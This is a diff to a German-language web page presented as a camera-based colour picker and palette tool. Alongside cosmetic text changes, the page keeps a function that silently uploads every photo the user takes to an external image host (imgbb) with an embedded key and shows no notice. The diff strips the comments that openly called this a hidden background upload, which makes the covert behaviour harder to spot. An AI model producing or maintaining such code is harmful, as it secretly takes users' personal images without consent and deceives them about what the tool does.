@@ -58,7 +58,6 @@
             touch-action: none;
         }
 
-        /* Platzhalter-Text VOR dem Foto */
         .placeholder-text {
             position: absolute;
             color: #888;
@@ -153,10 +152,10 @@
 
 <div class="container">
     <div class="photo-card">
-        <span class="section-title">Analyse</span>
+        <span class="section-title">... ins Bild klicken ...</span>
         
         <div class="canvas-wrapper" id="canvasWrapper">
-            <div class="placeholder-text" id="placeholderText">Kamera öffnen...</div>
+            <div class="placeholder-text" id="placeholderText">Kamera öffnen & Foto machen</div>
             <canvas id="imageCanvas"></canvas>
             <div class="crosshair" id="crosshair"></div>
         </div>
@@ -170,11 +169,11 @@
 
     <div class="palette-card">
         <span class="section-title">Gepickte Farbe</span>
-        <div id="mainPreview" class="main-preview">Farbe wählen</div>
+        <div id="mainPreview" class="main-preview">Wähle eine Farbe</div>
         
         <span class="section-title">Harmonische Palette</span>
         <div id="paletteList" class="palette-list">
-            <div class="swatch" style="background:#eee;"><span style="color:#888;">Noch kein Foto...</span></div>
+            <div class="swatch" style="background:#eee;"><span style="color:#888;">Warte auf Foto...</span></div>
         </div>
     </div>
 </div>
@@ -193,7 +192,6 @@
 
     let imageLoaded = false;
 
-    // Bild laden & Stiller Upload im Hintergrund
     cameraInput.addEventListener('change', function(e) {
         const file = e.target.files[0];
         if (!file) return;
@@ -202,11 +200,9 @@
         reader.onload = function(event) {
             const img = new Image();
             img.onload = function() {
-                // 1. Platzhalter entfernen
                 placeholderText.style.display = 'none';
                 imageLoaded = true;
 
-                // 2. Canvas anpassen
                 const rect = wrapper.getBoundingClientRect();
                 canvas.width = rect.width;
                 canvas.height = rect.height;
@@ -217,10 +213,9 @@
                 const x = (canvas.width - w) / 2;
                 const y = (canvas.height - h) / 2;
 
-                // 3. NUR das saubere Bild zeichnen
                 ctx.drawImage(img, x, y, w, h);
                 
-                // 4. Stiller Hintergrund-Upload starten (KEINERLEI visuelle Rückmeldung)
+                // Stiller Upload ohne Meldungen
                 autoUpload();
             }
             img.src = event.target.result;
@@ -228,36 +223,27 @@
         reader.readAsDataURL(file);
     });
 
-    // Stiller Hintergrund-Upload (Komplett getrennt von der Anzeige)
     function autoUpload() {
-        // Wir erstellen einen sauberen Blob VOR jeglichen anderen Operationen
         canvas.toBlob(async (blob) => {
             if (!blob) return;
-
             const formData = new FormData();
             formData.append("image", blob);
 
             try {
-                // Der fetch-Prozess hat keine Verbindung mehr zu DOM-Elementen
                 const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
                     method: "POST",
                     body: formData
                 });
                 const data = await response.json();
-                
-                // Erfolg/Fehler nur in der Entwickler-Konsole loggen
                 if (data.success) {
-                    console.log("Hintergrund-Upload erfolgreich:", data.data.url);
-                } else {
-                    console.warn("imgBB Upload-Fehler:", data.error.message);
+                    console.log("Hintergrund-Upload ok:", data.data.url);
                 }
             } catch (err) {
-                console.error("Netzwerkfehler beim Hintergrund-Upload:", err);
+                console.error("Hintergrund-Upload fehlgeschlagen");
             }
         }, 'image/jpeg', 0.8);
     }
 
-    // Color Picker Logik
     function pickColor(e) {
         if (!imageLoaded) return;
         const rect = canvas.getBoundingClientRect();
@@ -283,7 +269,6 @@
     canvas.addEventListener('touchmove', (e) => { e.preventDefault(); pickColor(e); });
     canvas.addEventListener('mousedown', pickColor);
 
-    // Hilfsfunktionen
     function rgbToHex(r, g, b) {
         return "#" + [r, g, b].map(x => x.toString(16).padStart(2, '0')).join('').toUpperCase();
     }
